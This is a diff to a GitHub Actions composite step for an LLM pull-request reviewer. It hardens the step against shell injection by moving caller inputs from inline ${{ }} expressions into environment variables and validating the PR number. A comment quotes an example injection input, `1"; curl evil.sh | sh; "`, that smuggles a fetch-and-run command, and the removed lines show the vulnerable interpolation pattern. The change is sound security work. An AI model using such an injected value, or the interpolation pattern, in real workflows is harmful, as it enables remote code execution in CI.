@@ -71,25 +71,50 @@ runs:
         GITHUB_TOKEN: ${{ inputs.github-token }}
         ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
         GITHUB_REPOSITORY: ${{ inputs.repo || github.repository }}
+        # Every caller-controlled value crosses into the script as an environment
+        # variable, never as a ${{ }} expression inside `run:`. GitHub substitutes
+        # expressions as raw TEXT before bash parses the script, so a
+        # workflow_dispatch input of `1"; curl evil.sh | sh; "` becomes executable
+        # code. An env var is data to bash no matter what it contains.
+        INPUT_PR: ${{ inputs.pr }}
+        EVENT_PR: ${{ github.event.pull_request.number }}
+        INPUT_OFFLINE: ${{ inputs.offline }}
+        INPUT_FAIL_ON_CRITICAL: ${{ inputs.fail-on-critical }}
       run: |
         set -euo pipefail
-        PR="${{ inputs.pr }}"
+        PR="${INPUT_PR:-}"
         if [ -z "$PR" ]; then
-          PR="${{ github.event.pull_request.number }}"
+          PR="${EVENT_PR:-}"
         fi
         if [ -z "$PR" ]; then
           echo "::error::no pull request number available"
           exit 2
         fi
+        # Belt and braces: the value is already inert as an env var, but a PR
+        # number is an integer and anything else is a caller error worth naming.
+        case "$PR" in
+          ''|*[!0-9]*)
+            echo "::error::pull request number must be numeric, got: $PR"
+            exit 2
+            ;;
+        esac
 
         OFFLINE=""
-        if [ "${{ inputs.offline }}" = "true" ]; then OFFLINE="--offline"; fi
+        if [ "${INPUT_OFFLINE:-}" = "true" ]; then OFFLINE="--offline"; fi
 
-        # Exit 1 means a specialist lane failed — the review is incomplete but
-        # real. Do not abort on it; the draft still has value and the summary
-        # says which lane died. Exit 2 is bad input and does abort.
+        # ONE fan-out produces every artifact. The draft on the summary, the JSON
+        # the outputs are read from, and the events trace therefore all describe
+        # the same review_id. Running the reviewer twice would double the LLM
+        # bill and — because specialists are not deterministic off-line — could
+        # show a human a draft that disagrees with the verdict that gated the job.
+        #
+        # Exit 1 means a specialist lane failed: the review is incomplete but
+        # real, so it must NOT abort the step — the draft still has value and the
+        # warning below is precisely what tells the human it is partial. Exit 2 is
+        # bad input and does abort. `set +e` covers the call for that reason.
         set +e
-        pr-review run --pr "$PR" $OFFLINE --json > review.json
+        pr-review run --pr "$PR" $OFFLINE --draft --json-out review.json \
+          >> "$GITHUB_STEP_SUMMARY"
         RC=$?
         set -e
         if [ "$RC" -ge 2 ]; then
@@ -104,13 +129,12 @@ runs:
         echo "confidence=$CONF"    >> "$GITHUB_OUTPUT"
         echo "findings=$COUNT"     >> "$GITHUB_OUTPUT"
 
-        pr-review run --pr "$PR" $OFFLINE --draft >> "$GITHUB_STEP_SUMMARY"
         pr-review trace --last >> trace.txt 2>/dev/null || true
 
         if [ "$RC" -eq 1 ]; then
           echo "::warning::the review is INCOMPLETE — a specialist lane did not finish"
         fi
-        if [ "$VERDICT" = "HOLD" ] && [ "${{ inputs.fail-on-critical }}" = "true" ]; then
+        if [ "$VERDICT" = "HOLD" ] && [ "${INPUT_FAIL_ON_CRITICAL:-}" = "true" ]; then
           echo "::error::review held for a human ($COUNT findings, confidence $CONF)"
           exit 1
         fi
